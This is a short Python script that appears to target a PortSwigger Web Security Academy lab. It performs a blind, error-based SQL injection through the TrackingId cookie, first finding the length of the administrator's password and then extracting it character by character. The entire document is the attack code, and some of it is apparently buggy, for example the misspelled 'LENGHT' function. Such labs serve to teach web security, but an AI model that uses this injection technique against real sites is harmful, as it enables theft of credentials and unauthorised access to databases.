import requests
import string


url = 'https://0ade005a04be6b84801e087b00500065.web-security-academy.net/'

tid='mMSF7q4U3dMXs2Olers'


cookie={"TrackingId":tid}

response = requests.get(url,cookies=cookie)

if "Hologram" in response.text:
    print("[+] Testing successfully")

length_pass=0

for i in range(101):
    print("[-] finding the lenght of password with",i)
    tid = f"mMSF7q4U3dMXs2Olers' || (select CASE WHEN (LENGHT(password)={i}) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')--"
    cookie={"TrackingId":tid}
    response = requests.get(url,cookies=cookie)
    
    if "Internal" in response.text:
        length_pass=i
        break

print("[!] boom! we have found that:",length_pass)

txt = string.ascii_lowercase + string.digits+string.ascii_uppercase

pass_admin=''

for i in range(1,length_pass+1):
    for j in txt:
        pass_admin+=j
        tid = f"mMSF7q4U3dMXs2Olers' ||  (select CASE WHEN (SUBSTR(password,1,{i})='{pass_admin}') THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')--"
        cookie={"TrackingId":tid}
        response = requests.get(url,cookies=cookie)
        if "Internal" in response.text:
            break
        else:
            pass_admin=pass_admin[:-1]
print("[++] full password",pass_admin)
